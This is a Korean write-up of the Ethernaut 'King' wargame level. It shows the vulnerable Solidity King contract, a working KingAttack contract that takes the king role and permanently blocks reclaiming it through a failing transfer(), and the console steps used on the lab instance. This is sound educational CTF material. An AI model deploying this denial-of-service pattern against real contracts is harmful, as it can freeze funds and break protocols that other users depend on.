https://teberr.notion.site/Ethernaut-King-ee7e74038d4f4cd09ba1954f12534b45

![King.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d9412a04-2276-4f66-bed2-bfdda9784419/King.png)

> 현재 컨트랙트의 prize보다 더 많은 이더를 보내면 King이 되는 간단한 게임입니다.  
만약 인스턴스를 제출하게 되면 level 컨트랙트가 다시 king이 되려고 움직이게 됩니다. 우리는 level 컨트랙트가 king이 되지 못하도록 막으면 성공입니다.
> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

# 코드 분석 및 공격 설계

이 컨트랙트의 인스턴스는 level이 생성하기 때문에 owner가 level 컨트랙트로 고정이 되어있다. 이 컨트랙트는 작동 구조가 현재 prize보다 많은 양의 이더를 받으면 받은 만큼 기존의 king에게 보내고 prize 값을 갱신하며 그 이더를 보낸 주소를 새로운 king으로 바꾸게 된다. 즉 다음에 king이 될 주소가 기존 king에게 더 많은 양의 이더를 보내주고 king의 권한을 얻는 구조이다.

그런데 owner인 level 컨트랙트는 이러한 과정을 거치지 않아도 된다. 

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
```

receive 함수의 조건인 require를 보면 owner는 prize 값보다 더 많은 양을 이 컨트랙트에 보내지 않고도 king이 될 수 있다. 그렇다면 어떻게 해야 내가 인스턴스를 제출했을 때 level이 king이 되지 못하도록 막을 수 있을까?

아예 컨트랙트 작동을 멈추게 만들면 된다. receive()함수 내에서 사용하는 transfer 함수는 

_to.transfer(msg.value) 형태로 사용이 되며 실패시 에러를 발생하는데 이더를 보내는데 실패하려면 전송 받는 쪽이 이더를 받을 수 없으면 된다.

그렇다면 이더를 받지 못하는 상황이란 어떻게 만들까? 컨트랙트를 만들되 receive 함수나 fallback 함수가 존재하지 않으면 이더를 받지 못하는 컨트랙트가 생성된다.

그러면 공격 시나리오는 정해졌다.

1. 이더를 받지 못하는 컨트랙트를 만든다.
2. 이더를 받지 못하는 컨트랙트가 king이 된다.
3. 문제 인스턴스를 제출하면 transfer를 통해 이더를 받지 못하는 컨트랙트에게 이더를 보내다 에러가 떠서 level 컨트랙트가 king이 되지 못한다. 

# 공격

먼저 king이 되기 위해서는 prize 값 보다 큰 이더를 보내야 하므로 prize 값을 알아야 한다.

![prize값.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/697bad57-be9d-4465-90a0-804afe04794a/prize%EA%B0%92.png)

```jsx
await contract.prize()
o {negative: 0, words: Array(3), length: 2, red: null}
	length:2
	negative:0
	red:null
	words:Array(3)
		0:13008896
		1:14901161
		length:3
		[[Prototype]]:Array(0)
	[[Prototype]]:Object
```

초기 prize 값이 조금 알아보기 힘들어서 스토리지에 직접 접근해서 prize 값을 읽어와 봤다 prize는 두번째 값이므로 1을 인자로 해주었다

```jsx
await web3.eth.getStorageAt('0x12286C1f9331521D7EAF882bDA53afA83ca61580',1)
'0x00000000000000000000000000000000000000000000000000038d7ea4c68000'
```

![이더.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a68f4f1e-2478-4b0d-80f1-3525105c1abe/%EC%9D%B4%EB%8D%94.png)

들어있는 prize의 값은 38d7ea4c68000 값인데 이는 10진수로 변환하면 10^15 Wei가 된다. 1이더가 10^18Wei이므로 0.001이더만큼 들어있음을 확인할 수 있다.

컨트랙트를 Remix에서 작성하여 컨트랙트의 주소로 king이 되어보자.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;

contract KingAttack{

    constructor(address payable _addr) public payable{
         (bool sent, ) = _addr.call{value: msg.value}("");
         require(sent);
    }

}
```

call을 사용해서 msg.value만큼 이더를 보낼 것인데 문제와 똑같이 0.6.0버전으로 하니 call형식이 안맞는다고 떠서 컴파일이 되지 않아서 0.6.2버전으로 올렸다. 

배포를 하기 위해서 공격대상인 문제 컨트랙트의 인스턴스의 주소를 보면

![인스턴스 주소.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f259ba6d-5cfd-4ca8-befb-3372f45d3af7/%EC%9D%B8%EC%8A%A4%ED%84%B4%EC%8A%A4_%EC%A3%BC%EC%86%8C.png)

```jsx
=> Instance address
0x12286C1f9331521D7EAF882bDA53afA83ca61580
```

0x12286C1f9331521D7EAF882bDA53afA83ca61580 임을 알 수 있다.

![value와 주소 입력.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/58ba4cd5-da56-40c6-841c-0faf82a2bd5b/value%EC%99%80_%EC%A3%BC%EC%86%8C_%EC%9E%85%EB%A0%A5.png)

그럼 이제 Value는 1,000,000,000,000,000 Wei로(10^15) 설정하고 공격 대상 인스턴스의 주소를 넣어서 내 컨트랙트를 Deploy하자.

![배포된 컨트랙트.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fb8f1313-d3fb-4aa5-b40f-6fd2961b078c/%EB%B0%B0%ED%8F%AC%EB%90%9C_%EC%BB%A8%ED%8A%B8%EB%9E%99%ED%8A%B8.png)

confrimed 되고나면 ‘0x010D79534bAbc648cD3603cDff445A6356389De0’ 주소의 내 컨트랙트가 배포된 것을 확인할 수 있다. 

![king 탈취.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/26c22951-cff4-4e9a-9685-f84d3472b79d/king_%ED%83%88%EC%B7%A8.png)

```jsx
await contract._king()
'0x010D79534bAbc648cD3603cDff445A6356389De0'
```

또한 king 권한도 내 컨트랙트가 탈취한 것을 확인할 수 있다. 내 컨트랙트는 receive와 fallback 함수가 존재하지 않으므로 level 컨트랙트가 다시 king을 탈취하기 위해 문제 인스턴스에서 receive함수를 실행하고 나면 내 컨트랙트로 transfer를 보내다가 에러가 떠서 king 권한 탈취를 실패하게 될것이다. 인스턴스를 제출하자.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/857357f6-dcda-4a8c-b4b5-21f407860ac3/%EC%84%B1%EA%B3%B5.png)

성공하였다.

# 문제 후기

이 문제는 2016년 2월 6일부터 8일까지 있었던 [King of The Ether Throne](https://www.kingoftheether.com/thrones/kingoftheether/index.html) 컨트랙트에서 있었던 일을 기반으로 만든 문제다. 이 컨트랙트에서는 다른 컨트랙트로 이더를 보낼 때 소량의 가스인 2300으로 지정되어 결제를 처리하기에 충분한 가스가 아니라서 지불이 실패하게 되어 이더가 다시 King of the etherThrone 으로 반환되었다..

그런데 이 컨트랙트에서는 지불이 실패하였음을 인지하지 못해서 기존 monarch 에게 보상금이 지급되지 않았음에도 불구하고 msg.sender를 king으로 만드는 오류가 있었다.

[http://www.kingoftheether.com/postmortem.html](http://www.kingoftheether.com/postmortem.html)

문제를 풀기 위한 컨트랙트에서 receive와 fallback 함수를 아예 제거하여 풀었는데 생각해보니 receive 함수를 만들고 revert를 넣어서 고의적으로 transaction을 실패하게 만들어도 될 것 같다.
